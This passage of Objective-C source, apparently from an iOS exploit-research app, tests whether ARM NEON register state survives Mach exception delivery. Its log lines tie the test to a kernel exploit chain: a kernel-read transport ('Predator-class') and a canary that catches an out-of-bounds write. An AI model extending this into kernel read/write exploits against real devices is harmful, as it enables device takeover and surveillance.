            "stp q22, q23, [%0, #352]\n"
            "stp q24, q25, [%0, #384]\n"
            "stp q26, q27, [%0, #416]\n"
            "stp q28, q29, [%0, #448]\n"
            "stp q30, q31, [%0, #480]\n"
            :
            : "r"(c->sample)
            : "memory");
        c->iters++;
        for (int q = 0; q < 64; q++) {
            if (c->sample[q] != c->magic[q]) {
                c->diffs++;
                /* the receipt row — print from the worker (bounded) */
                if (c->diffs <= 8)
                    p062_log(@"[B] CANARY HIT wid=%d qword=%d "
                             @"was=0x%016llx now=0x%016llx",
                             wid, q,
                             (unsigned long long)c->magic[q],
                             (unsigned long long)c->sample[q]);
                break;
            }
        }
    }
    return NULL;
}

static void p062_phaseB(void)
{
    p062_log(@"");
    p062_log(@"=== PHASE B: the self-sampling canary (no kernel RPC) ===");
    memset(g_can, 0, sizeof(g_can));
    int started = 0;
    for (int i = 0; i < P062_CANARY_N; i++) {
        g_can[i].quit = 0;
        if (pthread_create(&g_can[i].th, NULL, p062_canary_fn, &g_can[i]) == 0)
            started++;
    }
    for (int i = 0; i < 200; i++) {
        int rdy = 0;
        for (int j = 0; j < P062_CANARY_N; j++) if (g_can[j].ready) rdy++;
        if (rdy == started) break;
        usleep(1000);
    }
    p062_log(@"[B] %d/%d canaries live — 5 s window", started, P062_CANARY_N);
    usleep(5000000);
    uint64_t it = 0, df = 0;
    for (int i = 0; i < P062_CANARY_N; i++) {
        g_can[i].quit = 1;
        it += g_can[i].iters; df += g_can[i].diffs;
    }
    for (int i = 0; i < P062_CANARY_N; i++)
        if (g_can[i].th) pthread_join(g_can[i].th, NULL);
    p062_log(@"[B] iters=%llu diffs=%llu — the channel receipt: %@",
             (unsigned long long)it, (unsigned long long)df,
             it > 0 ? @"LIVE (the self-sample diff machinery works; diffs=0 "
                      @"on a clean system = the canary is ready to embed in "
                      @"P044's fire window)" :
                     @"DEAD (no iterations — check the asm constraints)");
    p062_log(@"[B] NOTE: a CANARY HIT row = a restored NEON state that "
             @"differs from the canonical — on a clean system that is a "
             @"kernel save/restore anomaly; inside P044's fire window it is "
             @"the OOB write's landing receipt (the thread-zone save buffer).");
}

/* ─────────────────────────── tap ─────────────────────────── */

@implementation P062NEONSelfTest

+ (NSString *)tap
{
        p062_reset_globals();
        p062_buf = [NSMutableString string];
        NSString *docs = NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
        NSString *path = [docs stringByAppendingPathComponent:
                          @"p062_neon_selftest_log.txt"];
        NSString *alias = [docs stringByAppendingPathComponent:
                           @"p06x_P062_log.txt"];
        p062_fd = open(path.UTF8String, O_CREAT | O_WRONLY | O_TRUNC, 0644);
        p062_fd_alias = open(alias.UTF8String, O_CREAT | O_WRONLY | O_TRUNC, 0644);

        p062_log(@"=== p062 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P062_BUILD);
        p062_log(@"NEON exception-state self-test (in-process, documented Mach APIs).");
        p062_log(@"Do NOT run under lldb — lldb steals brk #0. Launch from SpringBoard.");
        p062_log(@"Question: does 26.5 deliver ARM_NEON_STATE64 in exception");
        p062_log(@"messages, and does NEON set_state persist across resume?");
        p062_log(@"Board relevance: candidate transport for a kernel-read channel");
        p062_log(@"(Predator-class) AFTER a kernel write exists.");
        p062_log(@"No kernel interaction. NOT KRW. No hasKread. Isolation: this TAP only.");
        p062_log(@"log file: Documents/p062_neon_selftest_log.txt");
        p062_log(@"");

        NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p062"];
        if (stop) {
            p062_log(@"%@", stop);
            p062_close_log();
            return p062_buf ?: @"";
        }
        p062_log(@"%@", [LabDeviceProfile identBlock]);
        p062_log(@"ARM_NEON_STATE64 = %d, ARM_NEON_STATE64_COUNT = %u, "
                 @"sizeof(arm_neon_state64_t) = %zu (want flavor 17, count 132, size 528)",
                 ARM_NEON_STATE64, (unsigned)ARM_NEON_STATE64_COUNT,
                 sizeof(arm_neon_state64_t));

    /* v5 order: the value phases FIRST (A/B never ran on device — the
           app died at P1 before them); P1 last and opt-in (proven x3, and
           its brk is app-fatal while unconsumed). */
        p062_phaseA();
        p062_phaseB();
        p062_phase2();
        {
            NSString *docs = [NSSearchPathForDirectoriesInDomains(
                NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
            BOOL p1on = docs && [[NSFileManager defaultManager]
                fileExistsAtPath:[docs stringByAppendingPathComponent:@"p062_p1_enable"]];
            if (p1on) {
                p062_log(@"");
                p062_log(@"[P1] OPT-IN (Documents/p062_p1_enable): the brk test — "
                         @"APP-FATAL while the reply is unconsumed (the task-level "
                         @"fallback port below is the survival attempt)");
                p062_p1_run();   /* if a p062_p1_run wrapper exists; else the original call */
            } else {
                p062_log(@"");
                p062_log(@"[P1] SKIPPED (default): proven 64/64 on both devices "
                         @"(the 17, the 12 x2). Documents/p062_p1_enable to re-run — "
                         @"PANIC-FREE for the KERNEL but APP-FATAL for this process "
                         @"while the 0x10000003 reply wall stands.");
            }
        }

        p062_log(@"");
        p062_log(@"=== VERDICT ===");
        p062_log(@"P1 neonFlavorSeen=%d count=%u magicMatch=%d/%d — exception NEON channel "
                 @"%@ on this build.",
                 g_neonFlavorSeen, g_neonCountSeen, g_neonMatchCount, P062_NEON_QWORDS,
                 g_p1_pass ? @"PRESENT" : @"NOT PRESENT/BROKEN");
        p062_log(@"P2 set_state persist %@.", g_p2_pass ? @"PASS" : @"FAIL");
        p062_log(@"Board impact: if P1 PASS, NEON exception channel is a viable");
        p062_log(@"transport candidate for the kernel-read half (Predator-class),");
        p062_log(@"pending a kernel-side delivery path (43748 conversion).");
        p062_log(@"Downstream of conversion, not a replacement for P044. Isolation TAP.");
        p062_log(@"NOT KRW. NOT hasKread. Read-only self-test.");

        p062_close_log();
        return p062_buf ?: @"";
}

@end
